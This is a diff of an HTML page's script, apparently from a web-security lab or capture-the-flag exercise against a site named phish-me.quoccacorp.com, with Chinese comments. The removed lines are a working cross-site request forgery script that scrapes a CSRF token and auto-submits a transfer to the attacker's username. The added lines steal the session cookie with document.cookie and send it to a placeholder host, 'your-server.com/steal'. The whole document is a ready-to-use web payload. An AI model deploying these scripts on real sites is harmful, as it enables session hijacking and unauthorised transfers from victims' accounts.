@@ -2,39 +2,14 @@
 <body>
 
 <script>
-(async () => {
-  // 1. fetch 首页，获取 csrf_token
-  const res = await fetch('/');  // 相对路径，Hamish访问时就是https://phish-me.quoccacorp.com/
-  const text = await res.text();
-  const tokenMatch = text.match(/name="csrf_token" value="([^"]+)"/);
-
-  if (tokenMatch) {
-    const csrfToken = tokenMatch[1];
-
-    // 2. 构造并提交转账请求
-    const form = document.createElement('form');
-    form.action = '/api/transfer';  // 注意是 /api/transfer
-    form.method = 'POST';
-
-    const tokenInput = document.createElement('input');
-    tokenInput.name = 'csrf_token';
-    tokenInput.value = csrfToken;
-    form.appendChild(tokenInput);
-
-    const usernameInput = document.createElement('input');
-    usernameInput.name = 'username';
-    usernameInput.value = 'z5508657';  // 你的用户名
-    form.appendChild(usernameInput);
-
-    const amountInput = document.createElement('input');
-    amountInput.name = 'amount';
-    amountInput.value = '100';  // 转最大额度
-    form.appendChild(amountInput);
-
-    document.body.appendChild(form);
-    form.submit();
-  }
-})();
+// 获取当前会话的cookie
+const cookies = document.cookie;
+  
+// 将cookie发送到你的服务器
+fetch('https://your-server.com/steal?data=' + encodeURIComponent(cookies));
+  
+// 或者直接显示出来方便复制
+document.body.innerHTML = '<pre>' + cookies + '</pre>';
 </script>
 
 </body>
